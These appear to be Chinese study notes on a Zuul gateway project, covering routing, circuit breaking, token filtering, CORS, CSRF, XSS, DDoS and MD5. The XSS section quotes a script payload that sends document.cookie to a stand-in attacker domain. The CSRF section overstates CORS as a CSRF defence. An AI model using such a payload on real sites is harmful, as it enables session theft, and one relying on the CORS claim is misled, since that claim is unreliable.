### Zuul作为整个微服务入口，实现请求路由、负载均衡、限流、权限控制等功能
 
 - 作为api网关，zuul负责其他服务的请求路由，通过请求url，将请求转发到对应的服务。
 - 配置了 `hystrix`组件，当请求过多时，进行熔断限流处理。
 - 配置了 `rabbion`组件，将请求负载均衡到服务集群中的不同机器上。
 - 定义了一个前置过滤器，在用户请求到达网关时进行访问控制
     - 无须权限的url直接放行
     - 需要权限的url需要先进行token解析，然后根据解析结果判断是否放行
 ```java
public class AuthFilter extends ZuulFilter {}
```

 - 进行了跨域资源共享配置
    1. 服务器配置了可以访问的域，以及请求方法，请求头部信息。
    2. 对于简单请求，用户在发送请求时，浏览器会自动添加 `Origin` 头部信息
    3. 对于复杂请求，浏览器先发送一次带有 `Origin` 字段的 `OPTION` 请求，检测是否允许跨域访问，然后再发送真实请求
    4. 服务器会判断请求头部的Origin信息是否在配置的 `AllowedOrigin` 中
    5. 服务器响应头部信息中包含配置的 `Access-Control-Allow-Origin` 以及是否允许携带cookie等字段
    6. 浏览器检测到 `Origin` 字段中的值若存在于  `Access-Control-Allow-Origin` 字段中便会显示相应数据
    7. 浏览器检测到 `Origin` 字段中的值不存在于  `Access-Control-Allow-Origin` 字段中便会忽略响应，并报错
  
 - csrf攻击
  - 用户A登录了网站B，网站B在用户A的浏览器上存了cookie信息
  - 这时候用户A又去访问网站C，网站C中的一个链接点击后会对网站B发起恶意访问请求
  - 用户A点击后，对网站B发起了请求
  - 如果没有跨域访问限制，这时候网站B便执行了用户A的请求，导致恶意转账等结果
  - 在允许携带cookie的请求中，cors跨域资源共享则可以有效的抵御csrf攻击，用户A浏览网站C时发起恶意请求时，
    由于恶意请求属于非简单请求，浏览器会先发送一次带有 `Origin` 字段的 `OPTION` 请求，检测是否允许跨域访问，
    这时浏览器响应头部信息的 `Access-Control-Allow-Origin` 字段中没有 `Origin` 字段的值，因此不会发起真正的请求。
 
 - xss攻击
  - 我现在做了个博客系统，然后有一个用户在博客上发布了一篇文章，
    内容是`<script>window.open("www.gongji.com?param="+document.cookie)</script>`，
    如过我没有对它做处理，直接存到数据库里，当别的用户读取文章后，浏览器会执行这段js脚本，然后发起恶意攻击
  - 解决手段：对表单数据进行过滤和转义。
 
 - DDos分布式拒绝服务攻击
  - 攻击者利用很多设备在同一时间对目标进行大量访问请求，耗尽服务器资源，导致服务器无法正常响应。
  - 解决方案：
   - DDos攻击很难有效防御，可以通过购买更多的带宽
   - 使用多台服务器，并部署在不同的数据中心
   - 将静态资源部署到CDN上，利用CDN，就近访问，提高访问速度，同时又避免了服务器被攻击
   - 开启路由器反ip欺骗
   
 - 顺便复习一下MD5算法
  - MD5算法是信息摘要算法的一种实现，它可以从任意长度的明文字符生成128位的hash值。
  - MD5算法的过程分为四步：处理原文，设置初始值，循环加工，拼接结果
    1. 先计算出原文比特长度，然后对512求余的结果。如果不等于448，就填充原文使得原文对512求余的结果等于448。
        填充的方法是第一位填充1，其余位填充0。填充完后，信息的长度就是512*N+448。
        用剩余的位置64位记录原文的真正长度，这样处理后的信息长度就是512*(N+1)
    2. MD5的哈希结果长度为128位，按每32位分成一组共4组。这4组结果是由4个初始值A、B、C、D经过不断演变得到。
    3. 循环加工
        每一次循环都会让旧的ABCD产生新的ABCD。一共进行多少次循环呢？由处理后的原文长度决定。
        假设处理后的原文长度是M，主循环次数 = M / 512，每个主循环中包含 512 / 32 * 4 = 64次子循环。
    4. 拼接结果
    
 